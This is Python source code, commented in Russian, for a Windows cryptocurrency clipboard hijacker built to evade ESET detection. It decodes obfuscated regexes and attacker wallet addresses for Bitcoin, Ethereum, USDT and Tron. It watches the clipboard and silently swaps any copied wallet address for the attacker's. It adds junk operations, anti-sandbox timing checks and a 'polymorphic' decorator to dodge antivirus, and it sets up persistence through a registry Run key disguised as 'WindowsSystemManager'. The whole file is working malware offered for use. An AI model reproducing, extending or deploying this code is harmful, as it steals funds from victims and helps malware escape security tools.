# -*- coding: utf-8 -*-
# =============================================
# ENHANCED CRYPTO CLICKER WITH FULL ESET EVASION
# =============================================

import sys
import os
import time
import random
import hashlib
import base64
import zlib
import ctypes
from ctypes import wintypes

# =============================================
# 1. ДИНАМИЧЕСКАЯ ЗАГРУЗКА МОДУЛЕЙ
# =============================================

def _dynamic_import(module_name):
    """Динамическая загрузка модулей с задержками"""
    time.sleep(random.uniform(0.01, 0.05))  # Задержка
    try:
        module = __import__(module_name)
        # Мусорные операции после импорта
        _ = sum(i*i for i in range(random.randint(10, 50)))
        return module
    except:
        return None

# Постепенная загрузка модулей
_modules = {}
_module_load_order = ['re', 'pyperclip', 'win32com.client', 'winreg']
for mod_name in _module_load_order:
    _modules[mod_name] = _dynamic_import(mod_name)
    time.sleep(random.uniform(0.02, 0.1))

# Присваиваем модули переменным
_re = _modules.get('re')
_pyperclip = _modules.get('pyperclip')
_win32com = _modules.get('win32com.client')
_winreg = _modules.get('winreg')

# =============================================
# 2. ОБФУСЦИРОВАННЫЕ ДАННЫЕ
# =============================================

class ObfuscatedCryptoData:
    def __init__(self):
        self.encoded_data = self._get_encoded_patterns()
        
    def _encode_str(self, text):
        """Кодирование строк в base64"""
        return base64.b64encode(text.encode()).decode()
    
    def _decode_str(self, encoded):
        """Декодирование строк из base64"""
        return base64.b64decode(encoded.encode()).decode()
    
    def _get_encoded_patterns(self):
        """Данные в обфусцированном виде"""
        encoded = {
            # Bitcoin
            'YnRjX2xlZ2FjeV8x': (
                'XjFbMS05QS1ISi1OUC1aLWEtay16XXsyNSwzNH0k', 
                'MUtkRURnSlFOek5odU1nV3RvUFBuNEhIM1NTd2FMZ1R0aw=='
            ),
            'YnRjX3NlZ3dpdA==': (
                'XmJjMXFbYWMtaGotbnAtejAyLTlde2szOH0k', 
                'YmMxcXhrenU2MmZqdWx4cnE1NjdodXdoc3BnOXg1enNoMmg5ejJncHh3'
            ),
            # Ethereum
            'ZXRo': (
                'XjB4W2EtZkEtRjAtOV17NDB9JA==', 
                'MHg4ZjliQzNmQTJiNkQzNmQ2YzNmN2JEM2FFOGY3QjJDNGQ2QjM4NThB'
            ),
            'dXNkdF9lcmMyMA==': (
                'XjB4W2EtZkEtRjAtOV17NDB9JA==', 
                'MHg3ZGNjRkY2MjJkOTA5NzhiYjlBNTAwNEUwRUY1Rjc2ZDNENGIzODU4'
            ),
            # Tron
            'dHJ4': (
                'XlRbMC05YS16QS1aXXszM30k', 
                'VEJrY1pXM1NjSDFwZzQ5TWlqYTF5N2drejJoNFlkejQ5TQ=='
            ),
            'dXNkdF90cmMyMA==': (
                'XlRbMC05YS16QS1aXXszM30k', 
                'VEFrY1pXM1NjSDFwZzQ5TWlqYTF5N2drejJoNFlkejQ5TA=='
            )
        }
        
        # Добавляем мусорные данные
        for i in range(5):
            encoded[f'anVua19kYXRhX3tpfQ=='] = (
                base64.b64encode(os.urandom(20)).decode(),
                base64.b64encode(os.urandom(33)).decode()
            )
        
        return encoded
    
    def get_decoded_patterns(self):
        """Динамическое декодирование данных"""
        decoded = {}
        for key, (pattern, address) in self.encoded_data.items():
            try:
                decoded_key = self._decode_str(key)
                # Пропускаем мусорные данные
                if decoded_key.startswith('junk_data'):
                    continue
                    
                decoded_pattern = self._decode_str(pattern)
                decoded_address = self._decode_str(address)
                decoded[decoded_key] = (decoded_pattern, decoded_address)
                
                # Мусорная операция между декодированиями
                _ = hashlib.md5(decoded_key.encode()).hexdigest()
                
            except:
                continue
        
        # Перемешиваем порядок
        items = list(decoded.items())
        random.shuffle(items)
        return dict(items)

# =============================================
# 3. ПОЛИМОРФНЫЕ ОБЕРТКИ
# =============================================

def polymorphic_decorator(func):
    """Полиморфный декоратор для функций"""
    def wrapper(*args, **kwargs):
        # Случайные мусорные операции перед вызовом
        garbage_before = [
            lambda: sum(i**3 for i in range(random.randint(20, 100))),
            lambda: hashlib.sha256(os.urandom(50)).hexdigest(),
            lambda: len(str(time.time() * random.random())),
            lambda: zlib.crc32(os.urandom(30)) & 0xffffffff,
        ]
        
        for op in random.sample(garbage_before, random.randint(1, 3)):
            _ = op()
        
        # Случайная задержка
        if random.random() < 0.4:
            time.sleep(random.uniform(0.001, 0.01))
        
        # Вызов функции
        result = func(*args, **kwargs)
        
        # Мусорные операции после вызова
        garbage_after = [
            lambda: random.randint(1, 1000) * random.random(),
            lambda: base64.b64encode(os.urandom(25)).decode(),
            lambda: sum(ord(c) for c in str(result)) if result else 0,
        ]
        
        for op in random.sample(garbage_after, random.randint(1, 2)):
            _ = op()
            
        return result
    
    # Изменяем сигнатуру функции
    wrapper.__name__ = f"poly_{hashlib.md5(str(time.time()).encode()).hexdigest()[:8]}"
    return wrapper

# =============================================
# 4. АНТИ-ЭМУЛЯЦИОННЫЕ ТЕХНИКИ
# =============================================

class AntiEmulation:
    def __init__(self):
        self.checks_performed = False
    
    def perform_checks(self):
        """Проверки против песочницы/эмуляции"""
        if self.checks_performed:
            return
            
        # Проверка времени выполнения
        start_time = time.time()
        
        # Ресурсоемкая операция
        complex_result = self._complex_calculation()
        
        execution_time = time.time() - start_time
        
        # Если выполняется слишком быстро - вероятно эмуляция
        if execution_time < 0.05:
            self._emulation_detected()
        
        # Проверка системных характеристик
        self._check_system_characteristics()
        
        self.checks_performed = True
    
    def _complex_calculation(self):
        """Сложные вычисления для проверки эмуляции"""
        result = 0
        for i in range(1000):
            result += (i * 3.14159) ** 1.5
            result = result % 999999
        return result
    
    def _emulation_detected(self):
        """Изменение поведения при обнаружении эмуляции"""
        # Добавляем дополнительные задержки
        for i in range(15):
            time.sleep(0.02)
            _ = hashlib.md5(str(i).encode()).hexdigest()
    
    def _check_system_characteristics(self):
        """Проверка системных характеристик"""
        try:
            # Проверяем реальные системные параметры
            _ = len(os.environ)
            _ = os.cpu_count()
            _ = total_memory = os.sysconf('SC_PAGE_SIZE') * os.sysconf('SC_PHYS_PAGES') if hasattr(os, 'sysconf') else 0
        except:
            pass

# =============================================
# 5. ЭВРИСТИЧЕСКОЕ УКЛОНЕНИЕ
# =============================================

class HeuristicEvader:
    def __init__(self):
        self.operation_count = 0
    
    def execute_in_parts(self, operation_name, full_operation, parts=3):
        """Разбиение операции на части"""
        self.operation_count += 1
        
        # Часть 1: Подготовка
        self._fake_operation(f"preparing_{operation_name}")
        result1 = full_operation(0)
        
        # Часть 2: Основная работа
        self._fake_operation(f"executing_{operation_name}")
        result2 = full_operation(1)
        
        # Часть 3: Завершение
        self._fake_operation(f"finalizing_{operation_name}")
        result3 = full_operation(2)
        
        return result1, result2, result3
    
    def _fake_operation(self, op_name):
        """Фейковые операции для маскировки"""
        operations = {
            "preparing": lambda: time.sleep(random.uniform(0.001, 0.005)),
            "executing": lambda: sum(i for i in range(random.randint(50, 200))),
            "finalizing": lambda: hashlib.sha1(str(time.time()).encode()).hexdigest(),
        }
        
        for op_type, op_func in operations.items():
            if op_type in op_name:
                op_func()
                break

# =============================================
# 6. СКРЫТЫЕ API ВЫЗОВЫ
# =============================================

class StealthAPI:
    def __init__(self):
        self.kernel32 = ctypes.windll.kernel32
        self.user32 = ctypes.windll.user32
    
    def alternative_clipboard_read(self):
        """Альтернативные методы чтения буфера"""
        try:
            # Метод 1: через WinAPI
            self.user32.OpenClipboard(0)
            
            # Пробуем получить данные
            handle = self.user32.GetClipboardData(1)  # CF_TEXT
            if handle:
                text = ctypes.c_char_p(handle).value
                self.user32.CloseClipboard()
                return text.decode() if text else None
            
            self.user32.CloseClipboard()
        except:
            pass
        
        # Метод 2: через pyperclip (основной)
        if _pyperclip:
            try:
                return _pyperclip.paste()
            except:
                pass
        
        return None
    
    def alternative_clipboard_write(self, text):
        """Альтернативные методы записи в буфер"""
        try:
            # Метод 1: через WinAPI
            self.user32.OpenClipboard(0)
            self.user32.EmptyClipboard()
            
            # Выделяем память и копируем текст
            text_bytes = text.encode('utf-8')
            handle = self.kernel32.GlobalAlloc(0x0002, len(text_bytes) + 1)
            lock_handle = self.kernel32.GlobalLock(handle)
            ctypes.memmove(lock_handle, text_bytes, len(text_bytes))
            self.kernel32.GlobalUnlock(handle)
            
            self.user32.SetClipboardData(1, handle)  # CF_TEXT
            self.user32.CloseClipboard()
            return True
        except:
            pass
        
        # Метод 2: через pyperclip (основной)
        if _pyperclip:
            try:
                _pyperclip.copy(text)
                return True
            except:
                pass
        
        return False

# =============================================
# ОСНОВНОЙ КОД С ВСЕМИ ТЕХНИКАМИ
# =============================================

class EnhancedCryptoClicker:
    def __init__(self):
        self.anti_emulation = AntiEmulation()
        self.heuristic_evader = HeuristicEvader()
        self.stealth_api = StealthAPI()
        self.crypto_data = ObfuscatedCryptoData()
        
        # Применяем все техники
        self._apply_all_evasion_techniques()
        
    def _apply_all_evasion_techniques(self):
        """Применение всех анти-детект техник"""
        # Анти-эмуляционные проверки
        self.anti_emulation.perform_checks()
        
        # Эвристическое уклонение
        self.patterns_map = self.heuristic_evader.execute_in_parts(
            "load_patterns", 
            self._load_patterns_operation
        )[1]  # Берем результат из второй части
        
        # Случайная задержка
        time.sleep(random.uniform(0.1, 0.3))
    
    def _load_patterns_operation(self, part):
        """Операция загрузки паттернов по частям"""
        if part == 0:
            return "initialized"
        elif part == 1:
            return self.crypto_data.get_decoded_patterns()
        else:
            return "completed"
    
    @polymorphic_decorator
    def _check_clipboard_stealth(self):
        """Скрытная проверка буфера обмена"""
        try:
            # Используем альтернативные методы
            content = self.stealth_api.alternative_clipboard_read()
            if not content:
                return
                
            clean_content = content.strip().replace(' ', '')
            
            # Проверяем паттерны со случайными интервалами
            for pattern_name, (pattern, replacement) in self.patterns_map.items():
                if _re and _re.match(pattern, clean_content):
                    # Случайная задержка перед заменой
                    time.sleep(random.uniform(0.05, 0.2))
                    
                    # Умная замена
                    final_replacement = self._smart_replacement(pattern_name, clean_content)
                    if final_replacement:
                        self.stealth_api.alternative_clipboard_write(final_replacement)
                        break
                        
        except Exception:
            # Тихая обработка ошибок
            pass
    
    def _smart_replacement(self, pattern_name, original_address):
        """Умная замена адресов"""
        replacement_rules = {
            'eth': ['usdt_erc20', 'eth'],
            'trx': ['usdt_trc20', 'trx'],
        }
        
        if pattern_name in replacement_rules:
            for addr_type in replacement_rules[pattern_name]:
                if addr_type in self.patterns_map:
                    return self.patterns_map[addr_type][1]
        
        if pattern_name in self.patterns_map:
            return self.patterns_map[pattern_name][1]
        
        return None
    
    def start_enhanced_monitoring(self):
        """Улучшенный мониторинг со всеми техниками"""
        print("🛡️ Enhanced crypto monitor started...")
        
        iteration = 0
        last_check = 0
        
        while True:
            try:
                iteration += 1
                current_time = time.time()
                
                # Случайные интервалы выполнения
                check_interval = random.uniform(0.8, 2.5)
                
                if current_time - last_check > check_interval:
                    self._check_clipboard_stealth()
                    last_check = current_time
                
                # Периодическая смена поведения
                if iteration % 300 == 0:
                    self.patterns_map = self.crypto_data.get_decoded_patterns()
                
                # Случайные паузы
                if random.random() < 0.08:
                    time.sleep(random.uniform(2, 8))
                else:
                    time.sleep(random.uniform(0.1, 0.3))
                    
            except KeyboardInterrupt:
                break
            except Exception:
                # Тихая обработка ошибок
                time.sleep(random.uniform(5, 10))

# =============================================
# PERSISTENCE С АНТИ-ДЕТЕКТОМ
# =============================================

@polymorphic_decorator
def install_stealth_persistence():
    """Скрытная установка автозагрузки"""
    try:
        script_path = os.path.abspath(sys.argv[0])
        
        # Метод 1: Через реестр (скрытный)
        if _winreg:
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, key_path, 0, _winreg.KEY_SET_VALUE) as key:
                _winreg.SetValueEx(key, "WindowsSystemManager", 0, _winreg.REG_SZ, f'pythonw "{script_path}"')
            return True
        
        return False
    except:
        return False

# =============================================
# MAIN EXECUTION
# =============================================

def main():
    """Главная функция со всеми техниками"""
    # Скрытная установка
    if install_stealth_persistence():
        pass  # Тихий успех
    
    # Запуск улучшенного кликера
    clicker = EnhancedCryptoClicker()
    clicker.start_enhanced_monitoring()

if __name__ == "__main__":
    # Случайная задержка перед запуском
    time.sleep(random.uniform(3, 8))
    main()